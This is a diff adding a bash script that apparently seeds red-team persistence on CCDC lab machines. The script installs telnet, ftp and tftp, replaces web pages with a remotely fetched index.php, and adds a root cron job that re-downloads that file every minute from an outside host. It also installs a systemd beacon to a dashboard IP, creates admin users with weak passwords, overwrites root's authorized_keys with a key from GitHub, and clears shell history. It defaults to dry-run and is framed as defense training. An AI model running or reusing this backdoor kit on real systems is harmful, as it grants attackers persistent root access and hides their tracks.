@@ -1,0 +1,407 @@
+#!/usr/bin/env bash
+set -Eeuo pipefail
+
+# CCDC lab script that seeds vulnerable configurations in a controlled way.
+# For safety, the default mode only shows the actions it would perform.
+
+DRY_RUN=1
+ASSUME_YES=0
+OS="unknown"
+ADMIN_GROUP=""
+
+WEB_REPO_URL="${WEB_REPO_URL:-https://github.com/banago/simple-php-website.git}"
+INDEX_URL="${INDEX_URL:-https://raw.githubusercontent.com/4rji/ccdc/main/index.php}"
+ROOT_KEY_URL="${ROOT_KEY_URL:-https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub}"
+CRON_LINE="${CRON_LINE:-* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php}"
+CANARY_URL="${CANARY_URL:-http://172.16.102.58:8081/checkin}"
+CANARY_INTERVAL="${CANARY_INTERVAL:-3}"
+CANARY_SERVICE="redhavi-canary.service"
+CANARY_TIMER="redhavi-canary.timer"
+
+usage() {
+    cat <<'EOF'
+Usage: redhavi-fedora [--apply] [--yes]
+
+Options:
+  --apply    Apply real changes. Without this option, only print actions.
+  --yes      Skip the interactive confirmation when using --apply.
+  -h, --help Show this help message.
+
+Optional variables:
+  WEB_REPO_URL    Test PHP repository.
+  INDEX_URL       index.php used to replace web pages.
+  ROOT_KEY_URL    Public key installed in /root/.ssh/authorized_keys.
+  CRON_LINE       Exact line added to root's crontab.
+  CANARY_URL      Dashboard endpoint (default: http://172.16.102.58:8081/checkin).
+  CANARY_INTERVAL Minutes between check-ins (default: 3).
+
+Warning:
+  This script installs insecure packages, modifies the web root, creates users,
+  adds an SSH key for root, leaves lab cron and systemd jobs in place, and
+  clears shell history when it finishes.
+  Run it only on authorized, disposable machines.
+EOF
+}
+
+log() {
+    printf '[*] %s\n' "$*"
+}
+
+warn() {
+    printf '[!] %s\n' "$*" >&2
+}
+
+die() {
+    printf '[ERROR] %s\n' "$*" >&2
+    exit 1
+}
+
+run() {
+    if [ "$DRY_RUN" -eq 1 ]; then
+        printf '[DRY-RUN] '
+        printf '%q ' "$@"
+        printf '\n'
+        return 0
+    fi
+
+    "$@"
+}
+
+confirm_apply() {
+    [ "$DRY_RUN" -eq 0 ] || return 0
+    [ "$ASSUME_YES" -eq 0 ] || return 0
+
+    warn "You are about to apply vulnerable changes to this system."
+    printf 'Type LAB to continue: '
+    read -r answer
+    [ "$answer" = "LAB" ] || die "Canceled."
+}
+
+validate_canary_settings() {
+    [[ "$CANARY_URL" =~ ^https?://[^[:space:]]+$ ]] \
+        || die "CANARY_URL must be an HTTP(S) URL without spaces."
+    [[ "$CANARY_INTERVAL" =~ ^[1-9][0-9]*$ ]] \
+        || die "CANARY_INTERVAL must be an integer greater than zero."
+}
+
+require_root() {
+    if [ "$DRY_RUN" -eq 0 ] && [ "$(id -u)" -ne 0 ]; then
+        die "Run as root to use --apply."
+    fi
+}
+
+detect_os() {
+    if [ -n "${OS_OVERRIDE:-}" ]; then
+        OS="$OS_OVERRIDE"
+    elif [ -r /etc/os-release ]; then
+        # shellcheck disable=SC1091
+        . /etc/os-release
+        OS="${ID:-unknown}"
+    fi
+
+    case "$OS" in
+        debian|ubuntu|kali|centos|rhel|ol|fedora|arch)
+            ;;
+        *)
+            die "Unsupported operating system for automatic installation: $OS"
+            ;;
+    esac
+
+    log "Detected operating system: $OS"
+}
+
+package_installed() {
+    local pkg="$1"
+
+    case "$OS" in
+        debian|ubuntu|kali)
+            dpkg-query -W -f='${Status}' "$pkg" 2>/dev/null | grep -q 'install ok installed'
+            ;;
+        centos|rhel|ol|fedora)
+            rpm -q "$pkg" >/dev/null 2>&1
+            ;;
+        arch)
+            pacman -Qi "$pkg" >/dev/null 2>&1
+            ;;
+    esac
+}
+
+install_package() {
+    local pkg="$1"
+
+    if package_installed "$pkg"; then
+        log "Package already installed: $pkg"
+        return 0
+    fi
+
+    case "$OS" in
+        debian|ubuntu|kali)
+            run apt-get install -y "$pkg"
+            ;;
+        centos|rhel|ol)
+            run yum install -y "$pkg"
+            ;;
+        fedora)
+            run dnf install -y "$pkg"
+            ;;
+        arch)
+            run pacman -S --noconfirm "$pkg"
+            ;;
+    esac
+}
+
+install_packages() {
+    local base_pkgs=("nano" "curl" "git" "php" "httpd")
+    local bad_pkgs=()
+    local packages=()
+    local package
+
+    case "$OS" in
+        debian|ubuntu|kali)
+            bad_pkgs=("telnet" "ftp" "tftp")
+            ;;
+        centos|rhel|ol)
+            bad_pkgs=("telnet" "ftp" "tftp" "tftp-server" "vsftpd")
+            ;;
+        fedora)
+            bad_pkgs=("telnet" "ftp" "tftp" "tftp-server" "vsftpd")
+            ;;
+        arch)
+            bad_pkgs=("inetutils" "tftp-hpa")
+            ;;
+    esac
+
+    packages=("${base_pkgs[@]}" "${bad_pkgs[@]}")
+
+    for package in "${packages[@]}"; do
+        install_package "$package"
+    done
+}
+
+set_immutable() {
+    local mode="$1"
+    local path="$2"
+
+    command -v chattr >/dev/null 2>&1 || {
+        warn "chattr is unavailable; skipping $mode $path"
+        return 0
+    }
+
+    if [ "$DRY_RUN" -eq 1 ] || [ -e "$path" ]; then
+        run chattr "$mode" "$path"
+    else
+        warn "$path does not exist; skipping chattr $mode"
+    fi
+}
+
+setup_web() {
+    log "Configuring lab web content..."
+
+    run mkdir -p /var/www/simple-php-website /var/www/html
+
+    set_immutable -i /var/www/simple-php-website/index.php
+    set_immutable -i /var/www/index.php
+    set_immutable -i /var/www/html/index.php
+
+    if [ "$DRY_RUN" -eq 1 ] || [ ! -d /var/www/simple-php-website/.git ]; then
+        run git clone "$WEB_REPO_URL" /var/www/simple-php-website
+    else
+        run git -C /var/www/simple-php-website pull --ff-only
+    fi
+
+    run curl -fsSL -o /var/www/simple-php-website/index.php "$INDEX_URL"
+    run curl -fsSL -o /var/www/index.php "$INDEX_URL"
+    run curl -fsSL -o /var/www/html/index.php "$INDEX_URL"
+
+    set_immutable +i /var/www/simple-php-website/index.php
+}
+
+setup_cron() {
+    local tmp_cron
+
+    log "Configuring the lab crontab..."
+    tmp_cron="$(mktemp)"
+
+    if [ "$DRY_RUN" -eq 1 ]; then
+        log "Would add to root's crontab: $CRON_LINE"
+        rm -f "$tmp_cron"
+        return 0
+    fi
+
+    crontab -l >"$tmp_cron" 2>/dev/null || true
+    grep -Fqx "$CRON_LINE" "$tmp_cron" || printf '%s\n' "$CRON_LINE" >>"$tmp_cron"
+    crontab "$tmp_cron"
+    rm -f "$tmp_cron"
+}
+
+write_systemd_unit() {
+    local path="$1"
+    local content="$2"
+
+    if [ "$DRY_RUN" -eq 1 ]; then
+        log "Would write $path"
+        return 0
+    fi
+
+    printf '%s\n' "$content" >"$path"
+    chmod 644 "$path"
+}
+
+setup_canary_timer() {
+    local service_path="/etc/systemd/system/$CANARY_SERVICE"
+    local timer_path="/etc/systemd/system/$CANARY_TIMER"
+    local systemd_canary_url="${CANARY_URL//%/%%}"
+    local service_content
+    local timer_content
+
+    log "Configuring a dashboard check-in every $CANARY_INTERVAL minutes..."
+
+    service_content="[Unit]
+Description=Redhavi CCDC dashboard check-in
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/usr/bin/curl -fsS --max-time 15 -o /dev/null $systemd_canary_url"
+
+    timer_content="[Unit]
+Description=Run the Redhavi dashboard check-in periodically
+
+[Timer]
+OnBootSec=1min
+OnUnitActiveSec=${CANARY_INTERVAL}min
+AccuracySec=10s
+Unit=$CANARY_SERVICE
+
+[Install]
+WantedBy=timers.target"
+
+    write_systemd_unit "$service_path" "$service_content"
+    write_systemd_unit "$timer_path" "$timer_content"
+    run systemctl daemon-reload
+    run systemctl enable --now "$CANARY_TIMER"
+}
+
+enable_httpd() {
+    log "Starting and enabling httpd..."
+    run systemctl start httpd
+    run systemctl enable httpd
+}
+
+detect_admin_group() {
+    log "Detecting the administrators group..."
+
+    if getent group sudo >/dev/null 2>&1; then
+        ADMIN_GROUP="sudo"
+    elif getent group wheel >/dev/null 2>&1; then
+        ADMIN_GROUP="wheel"
+    else
+        ADMIN_GROUP="sudo"
+        run groupadd "$ADMIN_GROUP"
+    fi
+
+    log "Administrator group in use: $ADMIN_GROUP"
+}
+
+set_password() {
+    local user="$1"
+    local password="$2"
+
+    if [ "$DRY_RUN" -eq 1 ]; then
+        printf '[DRY-RUN] chpasswd for user %q\n' "$user"
+        return 0
+    fi
+
+    printf '%s:%s\n' "$user" "$password" | chpasswd
+}
+
+ensure_user() {
+    local user="$1"
+    local password="$2"
+    local home_flag="$3"
+    local expire_password="$4"
+
+    if id "$user" >/dev/null 2>&1; then
+        log "User $user already exists."
+        return 0
+    fi
+
+    log "Creating user $user..."
+    run useradd "$home_flag" -G "$ADMIN_GROUP" "$user"
+    set_password "$user" "$password"
+
+    if [ "$expire_password" = "yes" ]; then
+        run passwd --expire "$user"
+    fi
+}
+
+setup_users() {
+    detect_admin_group
+    ensure_user ccdc ccdc -m yes
+    ensure_user splunk ass -M no
+}
+
+setup_root_ssh_key() {
+    log "Configuring the SSH key for root..."
+
+    run mkdir -p /root/.ssh
+    set_immutable -i /root/.ssh/authorized_keys
+
+    run curl -fsSL -o /root/.ssh/authorized_keys "$ROOT_KEY_URL"
+    run chmod 600 /root/.ssh/authorized_keys
+    set_immutable +i /root/.ssh/authorized_keys
+}
+
+clear_shell_history() {
+    log "Clearing shell history..."
+
+    run history -c
+    run history -w
+}
+
+parse_args() {
+    while [ "$#" -gt 0 ]; do
+        case "$1" in
+            --apply)
+                DRY_RUN=0
+                ;;
+            --yes)
+                ASSUME_YES=1
+                ;;
+            -h|--help)
+                usage
+                exit 0
+                ;;
+            *)
+                die "Unknown option: $1"
+                ;;
+        esac
+        shift
+    done
+}
+
+main() {
+    parse_args "$@"
+    validate_canary_settings
+    detect_os
+    require_root
+    confirm_apply
+
+    install_packages
+    setup_web
+    setup_cron
+    setup_canary_timer
+    enable_httpd
+    setup_users
+    setup_root_ssh_key
+    clear_shell_history
+
+    if [ "$DRY_RUN" -eq 1 ]; then
+        log "Dry run complete. Use --apply on an authorized lab machine to apply the changes."
+    else
+        log "Changes applied."
+    fi
+}
+
+main "$@"
